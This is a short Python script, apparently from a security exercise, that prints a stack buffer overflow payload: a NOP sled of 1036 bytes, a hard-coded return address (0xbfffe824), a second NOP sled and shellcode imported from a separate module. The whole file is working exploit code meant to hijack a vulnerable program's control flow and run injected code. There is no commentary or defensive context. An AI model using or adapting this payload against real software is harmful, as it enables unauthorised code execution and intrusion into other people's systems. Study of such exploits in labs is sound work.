from shellcode import shellcode
import struct

eip = struct.pack("@I", 0xbfffe824)
nop = "\x90"
print (nop * 1036 + eip + nop * 498 + shellcode)
